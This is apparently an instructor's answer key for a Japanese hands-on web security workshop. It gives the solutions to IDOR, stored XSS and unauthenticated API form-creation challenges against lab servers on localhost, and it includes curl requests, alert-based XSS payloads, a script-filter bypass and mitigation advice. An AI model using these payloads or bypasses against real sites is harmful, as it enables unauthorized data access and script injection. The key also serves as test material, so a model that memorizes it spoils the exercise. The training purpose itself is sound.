# SecPro Workshop — 講師用解答

> **配布注意:** このファイルは講師のみに配布してください。受講者には [`問題.md`](問題.md) のみ渡してください。

## スタンプ一覧（早見表）

| チャレンジ | Easy | Medium |
|-----------|------|--------|
| IDOR | `秘密データ-OK!!` | `内部ID発見-OK!!` |
| XSS | `スクリプト実行-OK!!` | `サニタイズ突破-OK!!` |
| 無認可フォーム作成 | `無認可作成-OK!!` | `API直作成-OK!!` |

---

## 推奨タイムテーブル（100分）

| 時間 | 内容 |
|------|------|
| 0–10分 | 説明・環境確認・演習シート配布 |
| 10–35分 | Easy 3 チャレンジ |
| 35–40分 | 振り返り・解説 |
| 40–70分 | Medium 3 チャレンジ |
| 70–90分 | 解法共有・防御策講義 |
| 90–100分 | 全問クリア確認・質疑 |

---

## シードデータ

| フォーム | Easy ID | Medium publicId / 内部 ID |
|---------|---------|---------------------------|
| 【内部】機密アンケート | `1` | `feedback-2026` / `a1111111-1111-4111-8111-111111111111` |
| イベント満足度 | `2` | `event-survey` / `b2222222-2222-4222-8222-222222222222` |

### 管理者 Cookie（XSS 演習用）

`/admin.html` アクセス時に `admin_session=workshop_admin_secret` が Set-Cookie される。

---

# 初級 (Easy) 解法 — :3001

## ① IDOR — `秘密データ-OK!!`

```bash
curl "http://localhost:3001/api/responses?form_id=1"
```

レスポンス JSON の `stamp` フィールド、または `answers.q1` の機密テキストを確認。

**解説:** 認可チェックなし。`form_id` を書き換えるだけで他人の回答が取得できる典型 IDOR。

---

## ② XSS — `スクリプト実行-OK!!`

1. http://localhost:3001/?form=2 で自由記述に以下を入力して送信:

   ```html
   <script>alert('スクリプト実行-OK!!')</script>
   ```

2. http://localhost:3001/admin.html?form_id=2 を開く → alert が表示

**解説:** 回答が `innerHTML` でエスケープなしレンダリングされる Stored XSS。

---

## ③ 無認可フォーム作成 — `無認可作成-OK!!`

```bash
curl -X POST http://localhost:3001/api/forms \
  -H "Content-Type: application/json" \
  -d '{"title":"テスト","questions":[{"id":"q1","label":"名前","required":true,"type":"text"}]}'
```

レスポンス JSON の `stamp` フィールドを確認。

**解説:** `POST /api/forms` に認可チェックがない。誰でも API からフォームを作成できる。

---

# 中級 (Medium) 解法 — :3002

## ① IDOR — `内部ID発見-OK!!`

```bash
# 内部 ID を取得（_internal.form_id）
curl http://localhost:3002/api/forms

# 秘密フォームの ID（固定）: a1111111-1111-4111-8111-111111111111
curl "http://localhost:3002/api/responses?form_id=a1111111-1111-4111-8111-111111111111"
```

**解説:** UUID 化されているが、`GET /api/forms` レスポンスに `_internal.form_id` が漏洩。Network タブで拾える。

---

## ② XSS — `サニタイズ突破-OK!!`

1. http://localhost:3002/?form=event-survey で自由記述に以下を送信:

   ```html
   <img src=x onerror="alert('サニタイズ突破-OK!!')">
   ```

2. http://localhost:3002/admin.html?form_id=event-survey を開く

**別解:**

```html
<sc<script>ript>alert('サニタイズ突破-OK!!')</script>
```

**解説:** `<script>` タグの単純除去のみ。イベントハンドラやネストで迂回可能。

---

## ③ 無認可フォーム作成 — `API直作成-OK!!`

```bash
curl -X POST http://localhost:3002/api/forms \
  -H "Content-Type: application/json" \
  -d '{"title":"テスト","questions":[{"id":"q1","label":"名前","required":true,"type":"text"}]}'
```

レスポンス JSON の `stamp` フィールドを確認。

**解説:** 中級でも `POST /api/forms` に認可チェックがない。画面から作成できるが、API 直叩きでも同様にフォームを作成でき、スタンプが返る。

---

## よくあるつまずき

| 症状 | 対処 |
|------|------|
| Easy IDOR でデータが取れない | `form_id=0` ではなく `1` を試す |
| Medium IDOR で ID がわからない | 画面 UI ではなく Network タブで `/api/forms` の JSON を見る |
| XSS の alert が出ない | 管理者画面（`/admin.html`）を開かないとスクリプトは実行されない |
| フォーム作成で stamp が見つからない | Network タブで POST `/api/forms` のレスポンス JSON を確認する |

---

## 防御策（解説用）

| 脆弱性 | 対策 |
|--------|------|
| IDOR | 認可チェックの実装、内部 ID を API レスポンスに含めない |
| XSS | 出力エスケープ、Content-Security-Policy、DOMPurify 等 |
| 無認可フォーム作成 | 書き込み API に認可チェックを実装、管理者のみ作成可能にする |
